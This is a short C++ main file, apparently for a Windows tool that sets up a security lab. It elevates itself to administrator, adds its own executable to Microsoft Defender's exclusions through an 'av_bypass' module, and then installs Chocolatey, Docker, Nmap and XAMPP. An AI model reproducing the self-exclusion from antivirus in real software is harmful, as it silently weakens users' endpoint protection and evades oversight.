//
// Created by MateuszAndruszkiewic on 17.12.2024.
//
#include "modules/av/av_bypass.h"
#include "modules/configure/util.h"
#include "../lib/beauty_print.h"
#include "../lib/elevator.h"
#include <iostream>

int main() {
    if (!IsRunningAsAdmin()) {
        printWarning("Relaunching as admin");
        RelaunchAsAdmin();
    }

    AddCurrentExecutableToDefenderExclusions();

    checkAndInstallChocolatey();
    configureDocker();
    installNmap();
    configureXampp();

    return 0;
}